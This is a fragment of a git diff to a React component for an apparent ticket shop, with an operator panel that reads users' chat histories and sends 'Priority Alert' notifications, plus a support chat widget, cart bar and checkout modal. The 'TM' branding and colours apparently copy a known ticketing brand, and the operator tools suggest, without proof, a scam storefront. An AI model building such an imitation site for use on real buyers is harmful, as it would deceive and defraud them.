+                          <div className="flex-1 overflow-y-auto p-4 space-y-3">{(selectedUser.chatHistory || []).map((m, i) => (<div key={i} className={`flex ${m.sender==='system'?'justify-end':'justify-start'}`}><div className={`max-w-[70%] p-3 rounded-xl text-xs font-medium ${m.sender==='system'?'bg-[#026cdf] text-white':'bg-white text-gray-800 shadow-sm'}`}>{m.text}</div></div>))}</div>
+                          <div className="p-4 bg-white border-t border-gray-200 space-y-3">
+                              <div className="flex gap-2"><input className="flex-1 bg-gray-100 rounded-lg px-4 py-3 text-sm outline-none border border-transparent focus:border-[#026cdf]" placeholder="Support Chat Message..." value={adminMsg} onChange={e => setAdminMsg(e.target.value)} /><button onClick={sendAdminMessage} className="bg-[#026cdf] p-3 rounded-lg text-white hover:bg-blue-700 transition-all"><Send className="w-4 h-4" /></button></div>
+                              <div className="flex gap-2 border-t border-gray-100 pt-3"><input className="flex-1 bg-red-50 rounded-lg px-4 py-2 text-xs outline-none border border-transparent focus:border-red-500 text-red-900 placeholder:text-red-300" placeholder="Priority Alert (Bell Notification)..." value={adminAlert} onChange={e => setAdminAlert(e.target.value)} /><button onClick={sendAdminPing} className="bg-red-500 px-4 rounded-lg text-white text-xs font-black uppercase hover:bg-red-600"><Bell className="w-3 h-3" /></button></div>
                           </div>
                       </>
-                  ) : (
-                      <div className="flex-1 flex flex-col items-center justify-center text-gray-300">
-                          <MessageSquare className="w-16 h-16 mb-4" />
-                          <p className="font-bold text-sm uppercase tracking-widest">Select a Session</p>
-                      </div>
-                  )}
+                  ) : <div className="flex-1 flex flex-col items-center justify-center text-gray-300"><MessageSquare className="w-16 h-16 mb-4" /><p className="font-bold text-sm uppercase tracking-widest">Select a Session</p></div>}
               </div>
            </div>
         )}
       </main>
 
-      {/* --- LIVE CHAT WIDGET --- */}
-      {!isAdminLoggedIn && (
-        <>
-            <div className="fixed bottom-6 right-6 z-[200]">
-                <button onClick={() => setIsChatOpen(!isChatOpen)} className="bg-[#026cdf] w-14 h-14 rounded-full flex items-center justify-center shadow-2xl hover:scale-110 transition-transform relative">
-                    {isChatOpen ? <X className="w-6 h-6 text-white" /> : <MessageSquare className="w-6 h-6 text-white" />}
-                    {hasUnread && !isChatOpen && <div className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full border-2 border-white animate-bounce" />}
-                </button>
+      {!isAdminLoggedIn && <div className="fixed bottom-6 right-6 z-[200]"><button onClick={() => setIsChatOpen(!isChatOpen)} className="bg-[#026cdf] w-14 h-14 rounded-full flex items-center justify-center shadow-2xl hover:scale-110 transition-transform relative">{isChatOpen ? <X className="w-6 h-6 text-white" /> : <MessageSquare className="w-6 h-6 text-white" />}{hasUnread && !isChatOpen && <div className="absolute top-0 right-0 w-4 h-4 bg-red-500 rounded-full border-2 border-white animate-bounce" />}</button></div>}
+      
+      {isChatOpen && <div className="fixed bottom-24 right-6 w-[90vw] max-w-sm h-[450px] bg-white rounded-[30px] shadow-2xl overflow-hidden flex flex-col z-[200] animate-slideUp"><div className="bg-[#1f262d] p-4 flex items-center gap-3 border-b border-white/10"><div className="w-10 h-10 bg-[#026cdf] rounded-full flex items-center justify-center font-black text-white text-xs">TM</div><div><p className="font-bold text-white text-sm">Support Agent</p><p className="text-[10px] text-green-400 font-bold uppercase tracking-widest">Online</p></div></div><div className="flex-1 overflow-y-auto p-4 space-y-3 bg-gray-50">{chatMessages.map((m,i) => (<div key={i} className={`flex ${m.sender==='user'?'justify-end':'justify-start'}`}><div className={`max-w-[80%] p-3 rounded-2xl text-xs font-bold ${m.sender==='user'?'bg-[#026cdf] text-white rounded-br-none':'bg-white text-black border border-gray-100 rounded-bl-none'}`}>{m.text}</div></div>))}</div><div className="p-3 bg-white border-t flex gap-2"><input id="chat-inp" className="flex-1 bg-gray-100 rounded-xl px-4 text-sm text-black font-bold outline-none" placeholder="Message..." /><button onClick={() => { const el = document.getElementById('chat-inp'); if(el.value.trim()) { const newHistory = [...chatMessages, {sender:'user', text:el.value, timestamp: new Date().toISOString()}]; setChatMessages(newHistory); updateSession({ chatHistory: newHistory }); el.value = ''; } }} className="bg-[#026cdf] p-3 rounded-xl"><Send className="w-4 h-4 text-white" /></button></div></div>}
+      
+      {/* CLICKABLE CART */}
+      {cart.length > 0 && <div onClick={() => setShowCart(true)} className="fixed bottom-0 left-0 w-full bg-white border-t border-gray-100 p-6 z-50 animate-slideUp shadow-[0_-10px_40px_rgba(0,0,0,0.1)] cursor-pointer hover:bg-gray-50 transition-colors"><div className="max-w-7xl mx-auto flex items-center justify-between"><div><p className="text-xs font-black text-gray-400 uppercase tracking-widest">Total (Tap to view)</p><p className="text-3xl font-black text-gray-900">${cart.reduce((a,b) => a + b.price, 0)}</p></div><button onClick={(e) => { e.stopPropagation(); setCurrentPage('checkout'); }} className="bg-[#026cdf] text-white px-8 lg:px-12 py-4 rounded-full font-black uppercase italic tracking-widest shadow-[0_10px_30px_rgba(2,108,223,0.4)] hover:scale-105 active:scale-95 transition-all">Proceed to Pay</button></div></div>}
+      
+      {/* SHOW CART MODAL */}
+      {showCart && (
+            <div className="fixed inset-0 z-[300] bg-black/80 flex items-center justify-center p-4 animate-fadeIn">
+                <div className="bg-[#1f262d] w-full max-w-md rounded-3xl p-6 border border-white/10 shadow-2xl">
+                    <div className="flex justify-between items-center mb-6"><h3 className="text-xl font-black uppercase italic">Your Cart</h3><button onClick={() => setShowCart(false)}><X className="w-6 h-6 text-gray-400" /></button></div>
+                    <div className="space-y-3 max-h-60 overflow-y-auto">
+                        {cart.length === 0 ? <p className="text-gray-500 text-center text-xs uppercase tracking-widest">Cart is empty</p> : cart.map(c => (
+                            <div key={c.id} className="flex justify-between items-center bg-white/5 p-3 rounded-xl">
+                                <div><p className="font-bold text-xs text-white">{c.label}</p><p className="text-[10px] text-[#026cdf] font-black">${c.price}</p></div>
+                                <button onClick={() => setCart(cart.filter(x => x.id !== c.id))} className="text-red-500 hover:text-red-400"><Trash2 className="w-4 h-4" /></button>
+                            </div>
+                        ))}
+                    </div>
+                    {cart.length > 0 && <button onClick={() => { setShowCart(false); setCurrentPage('checkout'); }} className="w-full bg-[#026cdf] text-white py-4 rounded-xl font-black uppercase mt-6">Checkout Now</button>}
+                </div>
             </div>
-
-            {isChatOpen && (
-                <div className="fixed bottom-24 right-6 w-[90vw] max-w-sm h-[450px] bg-white rounded-[30px] shadow-2xl overflow-hidden flex flex-col z-[200] animate-slideUp">
-                <div className="bg-[#1f262d] p-4 flex items-center gap-3 border-b border-white/10">
-                    <div className="w-10 h-10 bg-[#026cdf] rounded-full flex items-center justify-center font-black text-white text-xs">TM</div>
-                    <div><p className="font-bold text-white text-sm">Support Agent</p><p className="text-[10px] text-green-400 font-bold uppercase tracking-widest">Online</p></div>
-                </div>
-                <div className="flex-1 overflow-y-auto p-4 space-y-3 bg-gray-50">
-                    {chatMessages.map((m,i) => (
-                        <div key={i} className={`flex ${m.sender==='user'?'justify-end':'justify-start'}`}>
-                            <div className={`max-w-[80%] p-3 rounded-2xl text-xs font-bold ${m.sender==='user'?'bg-[#026cdf] text-white rounded-br-none':'bg-white text-black border border-gray-100 rounded-bl-none'}`}>{m.text}</div>
-                        </div>
-                    ))}
-                </div>
-                <div className="p-3 bg-white border-t flex gap-2">
-                    <input id="chat-inp" className="flex-1 bg-gray-100 rounded-xl px-4 text-sm text-black font-bold outline-none" placeholder="Message..." />
-                    <button onClick={() => {
-                        const el = document.getElementById('chat-inp');
-                        if(el.value.trim()) {
-                            const newHistory = [...chatMessages, {sender:'user', text:el.value, timestamp: new Date().toISOString()}];
-                            setChatMessages(newHistory);
-                            updateSession({ chatHistory: newHistory });
-                            el.value = '';
-                        }
-                    }} className="bg-[#026cdf] p-3 rounded-xl"><Send className="w-4 h-4 text-white" /></button>
-                </div>
-                </div>
-            )}
-        </>
       )}
-
-      {/* --- USER NOTIFICATION TOAST --- */}
-      {activeNotification && (
-        <div className="fixed top-20 left-4 right-4 z-[100] bg-[#ea0042] text-white p-4 rounded-2xl shadow-[0_10px_40px_rgba(0,0,0,0.5)] flex items-start gap-4 animate-bounce">
-          <Bell className="w-5 h-5 shrink-0" />
-          <div className="flex-1 text-sm font-bold">{activeNotification.text}</div>
-          <button onClick={() => setActiveNotification(null)}><X className="w-5 h-5" /></button>
-        </div>
-      )}
-
     </div>
   );
 }
